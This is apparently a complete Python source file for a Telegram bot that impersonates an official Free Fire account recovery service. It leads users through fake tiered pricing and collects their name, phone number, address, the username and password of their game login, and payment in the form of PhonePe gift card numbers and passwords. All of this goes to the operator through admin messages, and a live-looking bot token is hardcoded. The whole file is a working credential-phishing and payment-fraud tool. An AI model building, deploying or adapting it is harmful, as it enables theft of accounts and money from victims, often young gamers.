import os
import random
import string
import time
from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "9015143190:AAGaL2nkNpxlK6_1zutMDQdSU4YR6TNp1hk"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

user_states = {}
SESSION_TIMEOUT = 900  # 15 minutes session timeout

def generate_ticket_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))

def check_session_timeout(chat_id):
    if chat_id in user_states:
        last_active = user_states[chat_id].get("timestamp", 0)
        if time.time() - last_active > SESSION_TIMEOUT:
            del user_states[chat_id]
            return True
    return False

def safe_answer(call_id):
    try:
        bot.answer_callback_query(call_id)
    except Exception:
        pass

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.json
        if json_data:
            update = telebot.types.Update.de_json(json_data)
            bot.process_new_updates([update])
        return '', 200
    else:
        return 'Forbidden', 403

@app.route('/')
def index():
    return "FF Recovery Chat Bot is live and running 24/7!"

# 1. /start command -> Welcome Banner + Terms & Conditions
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_states[chat_id] = {"timestamp": time.time()}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Agree & Continue", callback_data="agree_tc"))
    
    banner_url = "https://images.unsplash.com/photo-1542751371-adc38448a05e?w=800"
    caption = (
        "🛡️ **Official Free Fire Account Recovery Support** 🛡️\n\n"
        "Please review and agree to our **Terms & Conditions** to proceed with your secure account recovery process."
    )
    
    try:
        bot.send_photo(chat_id, banner_url, caption=caption, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

# 2. T&C Agree -> Service Tier Selection
@bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
def agree_tc_callback(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("🟢 Basic Recovery", callback_data="plan_basic"),
        InlineKeyboardButton("⭐ Premium Recovery", callback_data="plan_premium")
    )
    
    bot.send_message(
        chat_id=chat_id,
        text="🛠️ **Select Recovery Service Tier**\n\nPlease choose your preferred recovery tier below:",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 3. Plan Selection & Duration Confirmation
@bot.callback_query_handler(func=lambda call: call.data in ["plan_basic", "plan_premium"])
def plan_selection_callback(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    is_premium = (call.data == "plan_premium")
    plan_name = "Premium Recovery" if is_premium else "Basic Recovery"
    duration = "24 - 48 Hours" if is_premium else "10 - 15 Days"
    
    user_states[chat_id] = {"plan": plan_name, "is_premium": is_premium, "timestamp": time.time()}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Confirm & Proceed", callback_data=f"confirm_plan_{'premium' if is_premium else 'basic'}"))
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"📋 **Selected Plan:** {plan_name}\n⏳ **Estimated Duration:** `{duration}`\n\nClick confirm to view available sub-options.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 4. Sub-Options & Pricing Display
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
def show_sub_options(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    is_premium = "premium" in call.data
    p1_price = "₹1799" if is_premium else "₹1199"
    p2_price = "₹2499" if is_premium else "₹1799"
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton(f"✉️ Mail Unlink ({p1_price})", callback_data=f"sub_mail_{'prem' if is_premium else 'basic'}"),
        InlineKeyboardButton(f"🔗 Unlink + Relink ({p2_price})", callback_data=f"sub_relink_{'prem' if is_premium else 'basic'}")
    )
    
    plan_text = "⭐ **Premium Plan Sub-Options**" if is_premium else "🟢 **Basic Plan Sub-Options**"
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"{plan_text}\n\nSelect the exact service requirement:",
        parse_mode="Markdown",
        reply_markup=markup
    )

# 5. Handle Sub-Option Selection & Start Chat Form Flow
@bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
def handle_sub_selection(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    parts = call.data.split("_")
    sub_type = parts[1]
    tier = parts[2]
    
    service_name = "Mail Unlink" if sub_type == "mail" else "Unlink + Relink"
    price = "1799" if (tier == "prem" and sub_type == "mail") else ("2499" if tier == "prem" else ("1199" if sub_type == "mail" else "1799"))
        
    user_states[chat_id].update({
        "sub_option": service_name,
        "price": price,
        "step": "get_name",
        "timestamp": time.time()
    })
    
    bot.send_message(
        chat_id,
        f"🎯 **Selected Service:** {service_name} (`₹{price}`)\n\nPlease enter your full **Name**:",
        parse_mode="Markdown"
    )

# 6. Step-by-Step Chat Form Data Collection
@bot.message_handler(func=lambda message: message.chat.id in user_states and "step" in user_states[message.chat.id])
def collect_user_details(message):
    chat_id = message.chat.id
    
    if check_session_timeout(chat_id):
        bot.send_message(chat_id, "⌛ Your session has expired due to inactivity. Please send `/start` to begin again.", parse_mode="Markdown")
        return
        
    user_states[chat_id]["timestamp"] = time.time()
    state = user_states[chat_id]["step"]
    text = message.text.strip()

    if state == "get_name":
        user_states[chat_id]["name"] = text
        user_states[chat_id]["step"] = "get_mobile"
        bot.send_message(chat_id, "📱 Please enter your valid **Mobile Number**:")

    elif state == "get_mobile":
        user_states[chat_id]["mobile"] = text
        user_states[chat_id]["step"] = "get_address"
        bot.send_message(chat_id, "🏠 Please enter your current **Address (City / State)**:")

    elif state == "get_address":
        user_states[chat_id]["address"] = text
        user_states[chat_id]["step"] = "get_login_method"
        
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("Google", callback_data="login_Google"),
            InlineKeyboardButton("Facebook", callback_data="login_Facebook")
        )
        markup.row(
            InlineKeyboardButton("Twitter (X)", callback_data="login_Twitter"),
            InlineKeyboardButton("VK / Apple", callback_data="login_Other")
        )
        bot.send_message(chat_id, "🔐 Please select your account **Login Method** using the buttons below:", reply_markup=markup)

    elif state == "get_credentials":
        user_states[chat_id]["credentials"] = text
        user_states[chat_id]["step"] = "get_uid"
        bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")

@bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
def handle_login_method(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    login_method = call.data.split("_")[1]
    if login_method == "Other":
        login_method = "VK / Apple"
    elif login_method == "Twitter":
        login_method = "Twitter (X)"
        
    if chat_id in user_states:
        user_states[chat_id]["login_method"] = login_method
        user_states[chat_id]["step"] = "get_credentials"
        
        bot.send_message(
            chat_id,
            f"🔐 **Selected Login Method:** {login_method}\n\n"
            "🔑 Please enter your login credentials in the following format:\n"
            "`Username/Mobile:Password` (Send in a single message)",
            parse_mode="Markdown"
        )

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_credentials")
def handle_credentials(message):
    chat_id = message.chat.id
    user_states[chat_id]["credentials"] = message.text.strip()
    user_states[chat_id]["step"] = "get_uid"
    bot.send_message(chat_id, "🆔 Please enter your Free Fire **UID (Player ID)**:")

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_uid")
def handle_uid(message):
    chat_id = message.chat.id
    user_states[chat_id]["uid"] = message.text.strip()
    user_states[chat_id]["step"] = "summary_review"
    
    data = user_states[chat_id]
    
    summary_text = (
        "📋 **Review Your Application Details:**\n\n"
        f"👤 **Name:** {data.get('name')}\n"
        f"📱 **Mobile:** {data.get('mobile')}\n"
        f"🏠 **Address:** {data.get('address')}\n"
        f"🔐 **Login Method:** {data.get('login_method')}\n"
        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
        f"🆔 **UID:** `{data.get('uid')}`\n"
        f"🛠️ **Service:** {data.get('sub_option')}\n"
        f"💰 **Total Amount:** ₹{data.get('price')}\n\n"
        "⚠️ *Please verify all details are correct before proceeding.*"
    )
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Confirm Details & Proceed to Payment", callback_data="proceed_payment"))
    
    bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)

# 7. Payment Screen & Gift Card Collection
@bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
def proceed_to_payment(call):
    safe_answer(call.id)
    chat_id = call.message.chat.id
    
    price = user_states.get(chat_id, {}).get("price", "0")
    user_states[chat_id]["step"] = "get_gift_card"
    
    payment_prompt = (
        f"💳 **SECURE PHONEPE GIFT CARD PAYMENT** 💳\n\n"
        f"Amount Payable: **₹{price}**\n\n"
        "Please complete the payment via PhonePe Gift Card and send your details in the exact format below:\n\n"
        "Format: `GiftCardNumber:Password`\n"
        "*(Example: `9876543210123456:abcd1234`)*"
    )
    bot.send_message(chat_id, payment_prompt, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.chat.id in user_states and user_states[message.chat.id].get("step") == "get_gift_card")
def handle_gift_card(message):
    chat_id = message.chat.id
    gift_card_input = message.text.strip()
    
    # Anti-Fraud Format Validation
    if ":" not in gift_card_input or len(gift_card_input) < 10:
        bot.send_message(
            chat_id, 
            "❌ **Invalid Format!** Please provide your gift card details in the correct format:\n`GiftCardNumber:Password`", 
            parse_mode="Markdown"
        )
        return

    gc_parts = gift_card_input.split(":", 1)
    gc_number = gc_parts[0].strip()
    gc_pass = gc_parts[1].strip()

    if not gc_number.isdigit() or len(gc_number) < 12:
        bot.send_message(chat_id, "❌ **Verification Failed:** The provided Gift Card number appears to be invalid. Please check and re-enter.", parse_mode="Markdown")
        return

    user_states[chat_id]["gift_card_no"] = gc_number
    user_states[chat_id]["gift_card_pass"] = gc_pass
    
    ticket_id = f"FF-{generate_ticket_id()}"
    data = user_states[chat_id]
    username = message.from_user.username or message.from_user.first_name
    
    bot.send_message(chat_id, "⏳ **Your details are under verification. Please wait for confirmation.**", parse_mode="Markdown")
    
    # Admin Split Notifications (2 Messages)
    msg_basic_details = (
        f"🚨 **New Recovery Request (Basic Info)**\n\n"
        f"🎟️ **Ticket ID:** `{ticket_id}`\n"
        f"👤 **User:** @{username} (`{chat_id}`)\n"
        f"📛 **Name:** {data.get('name')}\n"
        f"📱 **Mobile:** {data.get('mobile')}\n"
        f"🏠 **Address:** {data.get('address')}\n"
        f"🔐 **Login Method:** {data.get('login_method')}\n"
        f"🔑 **Credentials:** `{data.get('credentials')}`\n"
        f"🆔 **UID:** `{data.get('uid')}`"
    )
    
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Received", callback_data=f"pay_recv_{ticket_id}_{chat_id}"),
        InlineKeyboardButton("❌ Not Received", callback_data=f"pay_notrecv_{ticket_id}_{chat_id}")
    )
    
    msg_payment_details = (
        f"💳 **New Payment Verification (Gift Card)**\n\n"
        f"🎟️ **Ticket ID:** `{ticket_id}`\n"
        f"💰 **Amount:** ₹{data.get('price')}\n"
        f"🎁 **Gift Card No:** `{gc_number}`\n"
        f"🔒 **Password:** `{gc_pass}`"
    )
    
    bot.send_message(chat_id, msg_basic_details, parse_mode="Markdown")
    bot.send_message(chat_id, msg_payment_details, parse_mode="Markdown", reply_markup=markup)
    
    if chat_id in user_states:
        del user_states[chat_id]

# 8. Admin Action Handler
@bot.callback_query_handler(func=lambda call: call.data.startswith(("pay_recv_", "pay_notrecv_")))
def handle_admin_payment_action(call):
    safe_answer(call.id)
    data_parts = call.data.split("_")
    action = data_parts[1]
    ticket_id = data_parts[2]
    target_chat_id = data_parts[3]

    if action == "recv":
        bot.send_message(
            target_chat_id, 
            "✅ Your payment has been successfully verified and received. Your account unlinking process has started, and we will notify you once completed. Have a wonderful day!", 
            parse_mode="Markdown"
        )
        bot.edit_message_text(f"✅ Payment Verified & Approved (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    else:
        bot.send_message(
            target_chat_id, 
            "❌ Your PhonePe Gift Card verification failed or the payment could not be validated. Please verify your gift card details and restart the process using `/start`.", 
            parse_mode="Markdown"
        )
        bot.edit_message_text(f"❌ Payment Rejected (Ticket: `{ticket_id}`)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
